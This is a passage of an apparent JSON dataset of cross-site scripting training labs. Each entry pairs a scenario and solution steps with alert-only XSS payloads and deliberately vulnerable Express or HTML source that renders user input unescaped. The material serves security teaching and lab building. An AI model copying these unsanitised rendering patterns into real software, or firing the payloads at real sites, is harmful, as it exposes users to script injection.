      "Lab Description": "The forum application allows users to post messages that are stored on the server and later rendered on forum threads. The posts are not sanitized before display, letting attackers inject malicious scripts that persist across sessions.\nTo solve: Submit a forum post containing a payload and verify that it executes when the thread is viewed.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a new forum post using a payload like <script>alert('XSS')</script> via the web interface or Postman.",
        "Ensure that the post is stored in the forum database.",
        "Reload the forum thread and observe the execution of the payload.",
        "Attempt a variant payload using <svg/onload=alert(1)> to bypass filters.",
        "Confirm that the stored post triggers script execution on every page load."
      ],
      "payloads": [
        "<script>alert('Forum XSS')</script>",
        "<img src=x onerror=alert('Forum XSS')>",
        "<svg/onload=alert('Forum XSS')>",
        "<iframe src='javascript:alert(\"Forum XSS\")'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet forumPosts = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/forum', (req, res) => {\n  let postsHTML = forumPosts.map(post => `<p>${post}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Forum Posts</h2>\n        ${postsHTML}\n        <form action='/post' method='POST'>\n          <input type='text' name='post' placeholder='Your post'>\n          <button type='submit'>Submit</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/post', (req, res) => {\n  // Vulnerable: unsanitized forum post is stored and rendered\n  forumPosts.push(req.body.post);\n  res.redirect('/forum');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
    },
    {
      "Lab scenario": "DOM-based XSS via document.write in Widget Loader",
      "Lab Description": "A widget loader dynamically generates content using document.write based on a URL parameter. The parameter is not sanitized, allowing an attacker to supply a malicious payload that executes when the widget is loaded.\nTo solve: Modify the URL parameter to include a script payload and trigger its execution in the widget's output.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Access the widget loader page with a URL parameter, e.g., ?widget=<script>alert('XSS')</script>.",
        "Observe that the payload is injected via document.write and executed on page load.",
        "Test an alternative payload using an obfuscated version like <img src=x onerror=alert(1)> to bypass filters.",
        "Examine the source code to identify the vulnerable document.write call.",
        "Confirm that the payload executes in the browser context each time the widget is loaded."
      ],
      "payloads": [
        "<script>alert('Widget XSS')</script>",
        "<img src=x onerror=alert('Widget XSS')>",
        "<svg/onload=alert('Widget XSS')>",
        "<object data=\"javascript:alert('Widget XSS')\"></object>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/widget', (req, res) => {\n  const widgetParam = req.query.widget || 'Default Widget';\n  // Vulnerable: using document.write with unsanitized input\n  res.send(`\n    <html>\n      <body>\n        <h2>Widget Loader</h2>\n        <script>\n          document.write(unescape('${encodeURIComponent(widgetParam)}'));\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
    },
    {
      "Lab scenario": "Mutation-based XSS in Dynamic Theme Editor",
      "Lab Description": "The application provides a dynamic theme editor that allows users to customize the website's appearance by updating CSS stored on the server. The editor applies the submitted CSS directly into a style tag without sanitization, permitting XSS via malicious CSS payloads.\nTo solve: Inject a CSS-based payload using mutation events that triggers JavaScript execution when the theme is applied.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a theme update via the theme editor with a payload in the CSS, e.g., body {background: url('x');} and append a malicious attribute using a data URI with JavaScript.",
        "Use Burp Suite to modify the theme submission request if needed.",
        "Reload the page and observe the theme being applied unsafely.",
        "Craft an alternative payload using a mutation event, e.g., a payload that leverages expression() in older browsers or a data URI.",
        "Confirm that the payload results in script execution upon theme load."
      ],
      "payloads": [
        "<script>alert('Theme XSS')</script>",
        "<img src=x onerror=alert('Theme XSS')>",
        "<svg/onload=alert('Theme XSS')>",
        "<object data=\"javascript:alert('Theme XSS')\"></object>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet themeCSS = 'body { background: #fff; }';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/theme', (req, res) => {\n  res.send(`\n    <html>\n      <head>\n        <style>${themeCSS}</style>\n      </head>\n      <body>\n        <h2>Dynamic Theme Editor</h2>\n        <form action='/theme-update' method='POST'>\n          <textarea name='css' placeholder='Enter custom CSS'></textarea>\n          <button type='submit'>Update Theme</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/theme-update', (req, res) => {\n  // Vulnerable: saving unsanitized CSS input directly\n  themeCSS = req.body.css;\n  res.redirect('/theme');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
    },
    {
      "Lab scenario": "Reflected XSS in Search Query Parameter",
      "Lab Description": "The application provides a search feature where user input is reflected back into the page without proper sanitization. Attackers can inject scripts through the search parameter to achieve XSS.\nTo solve: Craft a malicious payload in the search query and observe if it executes on the response page.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Navigate to the search page and observe the URL format: /search?q=term",
        "Inject a payload such as <script>alert(1)</script> in the q parameter",
        "Reload the page and check if the script executes",
        "Try alternate payloads like <img src=x onerror=alert(1)> or <svg/onload=alert(1)>"
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "\"><script>alert(1)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const query = req.query.q || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Search Results for: ${query}</h2>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running'));\n"
    },
    {
      "Lab scenario": "Stored XSS in Product Review System",
      "Lab Description": "Users can leave reviews on product pages. The application does not sanitize or escape the user-submitted content before rendering it, leading to stored XSS.\nTo solve: Submit a malicious script in the review form and revisit the product page to confirm execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to a product page and submit a new review with a script payload",
        "Use <script>alert('XSS')</script> or similar",
        "Reload the product page and see if the script executes",
        "Try different vectors such as <img src=x onerror=alert(1)>"
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet reviews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/product', (req, res) => {\n  const reviewHtml = reviews.map(r => `<p>${r}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Product Page</h2>\n        ${reviewHtml}\n        <form action='/review' method='POST'>\n          <textarea name='comment'></textarea>\n          <button type='submit'>Submit Review</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/review', (req, res) => {\n  reviews.push(req.body.comment);\n  res.redirect('/product');\n});\n\napp.listen(3000, () => console.log('Running on port 3000'));\n"
    },
    {
      "Lab scenario": "DOM-based XSS in Location Hash",
      "Lab Description": "The application uses `location.hash` to dynamically update content on the page without sanitization. This allows attackers to inject scripts that execute when the hash is processed.\nTo solve: Inject a script payload into the URL hash and observe its execution in the page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to /dom-xss.html#<payload>",
        "Observe the innerHTML sink updating the page using the hash value",
        "Use a payload like #<img src=x onerror=alert(1)>",
        "Confirm that the script executes upon loading"
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.listen(3000, () => console.log('DOM XSS Lab running'));\n\n// public/dom-xss.html\n// <html>\n//   <body>\n//     <h2>Welcome</h2>\n//     <div id=\"output\"></div>\n//     <script>\n//       document.getElementById('output').innerHTML = location.hash.substring(1);\n//     </script>\n//   </body>\n// </html>\n"
    },
    {
      "Lab scenario": "Stored XSS in User Profile Bio",
      "Lab Description": "Users can update their profile bio. The application displays this information without escaping HTML content, leading to persistent XSS on profile pages.\nTo solve: Insert a payload in the bio field and revisit your profile page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the profile settings page",
        "Update the bio field with <script>alert('bio')</script>",
        "Save the profile and revisit the profile page",
        "Observe execution of the script"
      ],
      "payloads": [
        "<script>alert('bio')</script>",
        "<img src=x onerror=alert('bio')>",
        "<svg/onload=alert('bio')>",
        "<iframe src='javascript:alert(\"bio\")'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userProfile = { bio: 'This is my bio.' };\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>User Profile</h2>\n        <p>${userProfile.bio}</p>\n        <form action='/update-bio' method='POST'>\n          <textarea name='bio'></textarea>\n          <button type='submit'>Update Bio</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/update-bio', (req, res) => {\n  userProfile.bio = req.body.bio;\n  res.redirect('/profile');\n});\n\napp.listen(3000, () => console.log('Profile XSS running'));\n"
    },
    {
      "Lab scenario": "XSS via JavaScript URL in HREF Attribute",
      "Lab Description": "The application includes user-controlled links using anchor tags where the href is directly set to user input. This allows attackers to inject `javascript:` URLs to execute code when the link is clicked.\nTo solve: Inject a `javascript:` payload and click the link to confirm execution.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Visit the vulnerable page that displays user-submitted links",
        "Submit a malicious link with href=javascript:alert(1)",
        "Click on the rendered link to trigger the payload",
        "Try alternate payloads with encoding to bypass filters"
      ],
      "payloads": [
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "javascript:confirm(1)",
        "data:text/html,<script>alert('XSS')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userLink = '#';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/link', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Your Custom Link</h2>\n        <a href=\"${userLink}\">Click Me</a>\n        <form action='/link-update' method='POST'>\n          <input name='url' placeholder='Enter a URL'>\n          <button type='submit'>Submit</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/link-update', (req, res) => {\n  userLink = req.body.url;\n  res.redirect('/link');\n});\n\napp.listen(3000, () => console.log('JavaScript URI XSS lab running'));\n"
    },
    {
      "Lab scenario": "XSS in Client-Side Comment Preview Feature",
      "Lab Description": "The application has a live comment preview implemented entirely on the client-side. User input is inserted into the DOM using `innerHTML` without sanitization, allowing for DOM-based XSS.\nTo solve: Inject a payload in the comment box and observe the live preview triggering script execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Open the comment section with live preview enabled",
        "Type an XSS payload like <img src=x onerror=alert(1)>",
        "Observe if it executes in the preview panel",
        "Try variations using <svg>, <script>, or <iframe>"
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<script>alert('preview')</script>",
        "<svg/onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.listen(3000, () => console.log('Preview XSS lab running'));\n\n// public/preview.html\n// <html>\n//   <body>\n//     <h2>Leave a Comment</h2>\n//     <textarea id=\"comment\"></textarea>\n//     <div id=\"preview\"></div>\n//     <script>\n//       document.getElementById('comment').addEventListener('input', function(e) {\n//         document.getElementById('preview').innerHTML = e.target.value;\n//       });\n//     </script>\n//   </body>\n// </html>\n"
    },
    {
      "Lab scenario": "Stored XSS in Admin Feedback Viewer",
      "Lab Description": "Users can submit feedback via a contact form. The feedback is stored and later viewed by an admin. Since the admin interface renders raw HTML from stored feedback, it's vulnerable to stored XSS.\nTo solve: Submit a feedback with a payload and wait for the admin to view it.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a feedback message like <script>alert('admin')</script>",
        "Access the admin interface to view submitted feedback",
        "Observe if the script executes when admin opens the page",
        "Confirm it\u00e2\u20ac\u2122s stored and triggered only on admin-side"
      ],
      "payloads": [
        "<script>alert('admin')</script>",
        "<img src=x onerror=alert('admin')>",
        "<svg/onload=alert('admin')>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet feedbacks = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/contact', (req, res) => {\n  res.send(`\n    <form action='/submit-feedback' method='POST'>\n      <textarea name='msg'></textarea>\n      <button type='submit'>Send</button>\n    </form>\n  `);\n});\n\napp.post('/submit-feedback', (req, res) => {\n  feedbacks.push(req.body.msg);\n  res.redirect('/contact');\n});\n\napp.get('/admin/feedbacks', (req, res) => {\n  const allFeedback = feedbacks.map(f => `<div>${f}</div>`).join('');\n  res.send(`<html><body>${allFeedback}</body></html>`);\n});\n\napp.listen(3000, () => console.log('Admin feedback lab running'));\n"
    },
    {
      "Lab scenario": "XSS in Unescaped Error Message",
      "Lab Description": "The application displays error messages using unsanitized user input. If the user submits malformed input, it is echoed in the error output, enabling reflected XSS.\nTo solve: Trigger an error that includes a payload in the message.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit a request with a malformed parameter like /error?msg=<script>alert(1)</script>",
        "Observe if the error page reflects the message unsafely",
        "Try different payloads including <img src=x onerror=alert(1)>"
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "\"><script>alert(1)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/error', (req, res) => {\n  const msg = req.query.msg || 'Unknown error';\n  res.send(`<html><body><h2>Error: ${msg}</h2></body></html>`);\n});\n\napp.listen(3000, () => console.log('Error XSS lab running'));\n"
    },
    {
      "Lab scenario": "DOM XSS via Unescaped URL Parameter in Template",
      "Lab Description": "The application loads a `title` parameter from the URL and inserts it directly into a DOM template using `innerHTML`. If not escaped, this allows DOM-based XSS via the `title` parameter.\nTo solve: Inject a payload into the title parameter and confirm execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access /template.html?title=<img src=x onerror=alert(1)>",
        "View how the template injects the title",
        "Try encoded and alternate payloads to bypass filters",
        "Observe script execution"
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<script>alert(1)</script>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.listen(3000, () => console.log('Template XSS lab running'));\n\n// public/template.html\n// <html>\n//   <body>\n//     <div id=\"title\"></div>\n//     <script>\n//       const params = new URLSearchParams(window.location.search);\n//       const title = params.get('title') || 'Default';\n//       document.getElementById('title').innerHTML = title;\n//     </script>\n//   </body>\n// </html>\n"
    },
    {
      "Lab scenario": "XSS via File Name in File Upload Confirmation Page",
      "Lab Description": "When users upload a file, the server reflects the original filename back into the confirmation message without sanitization. This allows attackers to upload files with malicious names containing XSS payloads.\nTo solve: Upload a file with a filename containing a script and confirm that it executes on the confirmation page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Prepare a file named <script>alert(1)</script>.txt",
        "Upload it through the upload form",
        "View the confirmation page showing the uploaded filename",
        "Check if the script executes"
      ],
      "payloads": [
        "<script>alert(1)</script>.txt",
        "<img src=x onerror=alert(1)>.jpg",
        "<svg/onload=alert(1)>.svg",
        "\"><script>alert(1)</script>.png"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst multer = require('multer');\nconst app = express();\n\nconst storage = multer.memoryStorage();\nconst upload = multer({ storage });\n\napp.get('/upload', (req, res) => {\n  res.send(`<form action='/upload' method='POST' enctype='multipart/form-data'>\n    <input type='file' name='file'>\n    <button type='submit'>Upload</button>\n  </form>`);\n});\n\napp.post('/upload', upload.single('file'), (req, res) => {\n  const fileName = req.file.originalname;\n  res.send(`<h2>Uploaded: ${fileName}</h2>`);\n});\n\napp.listen(3000, () => console.log('File upload XSS lab running'));\n"
    },
    {
      "Lab scenario": "Reflected XSS via Search Query Parameter",
      "Lab Description": "The application has a search functionality that reflects user input directly into the results page without encoding or sanitization. An attacker can inject malicious scripts via the search query.\nTo solve: Inject a payload in the search parameter and confirm its execution in the results page.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Navigate to /search?q=<script>alert(1)</script>",
        "Observe if the payload is reflected on the page",
        "Try variations with <img>, <svg> and encoded characters"
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const q = req.query.q || '';\n  res.send(`<html><body><h3>Results for: ${q}</h3></body></html>`);\n});\n\napp.listen(3000, () => console.log('Search XSS lab running'));\n"
    },
    {
      "Lab scenario": "Stored XSS in User Profile Bio",
      "Lab Description": "Users can update their profile including a 'bio' field. The bio is displayed on their public profile page without escaping HTML. An attacker can store a payload in the bio that executes whenever someone views their profile.\nTo solve: Submit a malicious bio and visit the profile to confirm execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to /edit-profile and input <script>alert(1)</script> in the bio field",
        "Submit the form and go to /user/me",
        "Observe if the script executes on the profile page"
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userBio = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/edit-profile', (req, res) => {\n  res.send(`<form method='POST' action='/update-profile'>\n    <textarea name='bio'></textarea>\n    <button type='submit'>Save</button>\n  </form>`);\n});\n\napp.post('/update-profile', (req, res) => {\n  userBio = req.body.bio;\n  res.redirect('/user/me');\n});\n\napp.get('/user/me', (req, res) => {\n  res.send(`<h3>User Profile</h3><div>${userBio}</div>`);\n});\n\napp.listen(3000, () => console.log('Profile XSS lab running'));\n"
    },
    {
      "Lab scenario": "XSS in JavaScript Context via URL Parameter",
      "Lab Description": "The page dynamically sets a JavaScript variable using a URL parameter without proper sanitization. Injecting unescaped characters allows breaking out of the script context and executing arbitrary code.\nTo solve: Inject a payload that escapes the JavaScript string and executes your code.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Access /page?name=xyz and inspect the page source",
        "Try /page?name=';alert(1)//",
        "Observe if alert box is triggered due to injected code"
      ],
      "payloads": [
        "';alert(1)//",
        "';confirm(1)//",
        "'-alert(1)-'",
        "'+alert(1)+'"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/page', (req, res) => {\n  const name = req.query.name || 'Guest';\n  res.send(`\n    <html>\n      <body>\n        <script>\n          var user = '${name}';\n          document.write('Hello ' + user);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('JS Context XSS lab running'));\n"
    },
    {
      "Lab scenario": "DOM XSS via Fragment Identifier Injection",
      "Lab Description": "The page uses JavaScript to read the URL fragment (`location.hash`) and inserts it into the page using `innerHTML`. This allows attackers to craft a malicious link that executes code when opened.\nTo solve: Craft a URL with a malicious hash and verify code execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Open /hash.html#<img src=x onerror=alert(1)>",
        "Observe how the page handles the hash value",
        "Confirm if the script executes due to unsafe DOM insertion"
      ],
      "payloads": [
        "#<img src=x onerror=alert(1)>",
        "#<script>alert(1)</script>",
        "#<svg/onload=alert(1)>",
        "#<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "// hash.html\n<html>\n  <body>\n    <div id='output'></div>\n    <script>\n      document.getElementById('output').innerHTML = location.hash.substring(1);\n    </script>\n  </body>\n</html>\n"
    },
    {
      "Lab scenario": "XSS in Product Review Rendering",
      "Lab Description": "Users can leave reviews on products. These reviews are displayed on the product page without sanitization. Malicious users can inject HTML/JavaScript into the review content.\nTo solve: Submit a review containing a script and reload the product page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to /product/1/review and submit a payload like <script>alert(1)</script>",
        "Visit the product page /product/1 to check if it executes",
        "Try different payloads in case of filtering"
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet reviews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/product/1', (req, res) => {\n  const allReviews = reviews.map(r => `<p>${r}</p>`).join('');\n  res.send(`<h1>Product 1</h1>${allReviews}<a href='/product/1/review'>Leave a review</a>`);\n});\n\napp.get('/product/1/review', (req, res) => {\n  res.send(`<form method='POST'><textarea name='review'></textarea><button>Submit</button></form>`);\n});\n\napp.post('/product/1/review', (req, res) => {\n  reviews.push(req.body.review);\n  res.redirect('/product/1');\n});\n\napp.listen(3000, () => console.log('Review XSS lab running'));\n"
    },
    {
      "Lab scenario": "XSS in JSON Response Rendered via innerHTML",
      "Lab Description": "The application fetches a user profile via JSON and renders fields like 'nickname' using `innerHTML`. A malicious user can inject a script in their nickname, which is then executed when another user views the profile.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Register a new user with the nickname field set to <img src=x onerror=alert('XSS')>",
        "Login as another user and visit the malicious user\u00e2\u20ac\u2122s profile",
        "Observe the script execution from the JSON-rendered nickname"
      ],
      "payloads": [
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<script>alert('XSS')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "// profile.html\n<html>\n  <body>\n    <div id='nickname'></div>\n    <script>\n      fetch('/api/user/evil')\n        .then(res => res.json())\n        .then(data => {\n          document.getElementById('nickname').innerHTML = data.nickname;\n        });\n    </script>\n  </body>\n</html>\n\n// Express endpoint\nconst express = require('express');\nconst app = express();\n\napp.get('/api/user/evil', (req, res) => {\n  res.json({ nickname: \"<img src=x onerror=alert('XSS')>\" });\n});\n\napp.listen(3000, () => console.log('JSON XSS lab running'));\n"
    },
    {
      "Lab scenario": "XSS in Comment Section with Markdown Parsing",
      "Lab Description": "The app allows Markdown-formatted comments but doesn\u00e2\u20ac\u2122t properly sanitize embedded HTML. Attackers can bypass Markdown rendering with raw HTML containing XSS payloads.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Post a comment like <script>alert(1)</script> in Markdown input",
        "Visit the blog page and confirm if the payload executes",
        "Test HTML embedded inside Markdown if initial payloads are filtered"
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst marked = require('marked');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/post', (req, res) => {\n  const rendered = comments.map(c => marked(c)).join('<hr>');\n  res.send(`<h1>Blog Post</h1>${rendered}<form method='POST'><textarea name='comment'></textarea><button>Submit</button></form>`);\n});\n\napp.post('/post', (req, res) => {\n  comments.push(req.body.comment);\n  res.redirect('/post');\n});\n\napp.listen(3000, () => console.log('Markdown XSS lab running'));\n"
    },
    {
      "Lab scenario": "Stored XSS in Support Ticket System",
      "Lab Description": "Users can submit support tickets with titles and descriptions. These values are later reviewed by admins. The input is rendered without encoding, allowing attackers to inject stored XSS payloads into ticket fields.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a ticket with a title or description like <img src=x onerror=alert('Admin')>",
        "Wait or simulate an admin visiting the ticket view page",
        "Check for XSS execution"
      ],
      "payloads": [
        "<img src=x onerror=alert('Admin')>",
        "<svg/onload=alert('XSS')>",
        "<script>alert('Stored')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet tickets = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/submit-ticket', (req, res) => {\n  res.send(`<form method='POST'>\n    <input name='title' placeholder='Title'>\n    <textarea name='desc'></textarea>\n    <button>Submit</button>\n  </form>`);\n});\n\napp.post('/submit-ticket', (req, res) => {\n  tickets.push({ title: req.body.title, desc: req.body.desc });\n  res.redirect('/admin/tickets');\n});\n\napp.get('/admin/tickets', (req, res) => {\n  const view = tickets.map(t => `<h3>${t.title}</h3><p>${t.desc}</p>`).join('<hr>');\n  res.send(`<h1>All Tickets</h1>${view}`);\n});\n\napp.listen(3000, () => console.log('Support Ticket XSS lab running'));\n"
    },
    {
      "Lab scenario": "XSS via Event Handler Injection in User Settings",
      "Lab Description": "The app displays user settings including a customizable profile badge with attributes like color and label. Input is reflected in HTML attributes without validation, allowing injection of `onmouseover`, `onclick`, etc.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Go to /settings and set badge label to <div onmouseover=alert(1)>Hover me</div>",
        "Save changes and view the badge",
        "Hover to trigger the script"
      ],
      "payloads": [
        "<div onmouseover=alert(1)>Hover me</div>",
        "<button onclick=alert(1)>Click</button>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userBadge = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/settings', (req, res) => {\n  res.send(`<form method='POST'>\n    <input name='badge' placeholder='Badge HTML'>\n    <button>Save</button>\n  </form>`);\n});\n\napp.post('/settings', (req, res) => {\n  userBadge = req.body.badge;\n  res.redirect('/me');\n});\n\napp.get('/me', (req, res) => {\n  res.send(`<h1>Your Profile</h1>${userBadge}`);\n});\n\napp.listen(3000, () => console.log('Badge XSS lab running'));\n"
    },
    {
      "Lab scenario": "DOM XSS in History PushState Injection",
      "Lab Description": "The page uses `history.pushState` to change the visible URL and then updates part of the DOM using the value of `location.pathname`. An attacker can inject crafted content into the DOM by manipulating the path.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to /fakepath/<img src=x onerror=alert(1)>",
        "Check how `innerHTML` is being updated based on `location.pathname`",
        "Confirm XSS triggers via pathname injection"
      ],
      "payloads": [
        "/<img src=x onerror=alert(1)>",
        "/<svg/onload=alert(1)>",
        "/<script>alert(1)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "// domxss.html\n<html>\n  <body>\n    <div id='page'></div>\n    <script>\n      history.pushState({}, '', location.pathname);\n      document.getElementById('page').innerHTML = location.pathname.substring(1);\n    </script>\n  </body>\n</html>\n"
    },
    {
      "Lab scenario": "Reflected XSS via Error Message Parameter",
      "Lab Description": "The application reflects an error message from a query parameter directly into the page without sanitization. Attackers can inject JavaScript payloads through the `error` query string.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Navigate to /login?error=<script>alert('XSS')</script>",
        "Observe the reflected error message displayed on the page",
        "Confirm if JavaScript executes"
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/login', (req, res) => {\n  const error = req.query.error || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Login Page</h2>\n        ${error ? `<p style='color:red'>${error}</p>` : ''}\n        <form method='POST'><input name='user'><input name='pass' type='password'><button>Login</button></form>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Reflected XSS lab running'));\n"
    },
    {
      "Lab scenario": "DOM XSS via Location Hash Injection",
      "Lab Description": "The app uses `location.hash` to dynamically insert content into the page using `innerHTML`. This allows attackers to trigger XSS by modifying the fragment identifier.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to /#<img src=x onerror=alert(1)>",
        "Check if the fragment is parsed and rendered using innerHTML",
        "Confirm script execution upon page load"
      ],
      "payloads": [
        "#<script>alert(1)</script>",
        "#<svg/onload=alert(1)>",
        "#<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "<html>\n  <body>\n    <div id='output'></div>\n    <script>\n      document.getElementById('output').innerHTML = decodeURIComponent(location.hash.substring(1));\n    </script>\n  </body>\n</html>\n"
    },
    {
      "Lab scenario": "XSS in Search Autocomplete Suggestions",
      "Lab Description": "The search feature displays autocomplete suggestions fetched from the server and rendered using `innerHTML`. Malicious input from the query is reflected without sanitization.",
      "Difficulty Level": "Hard",
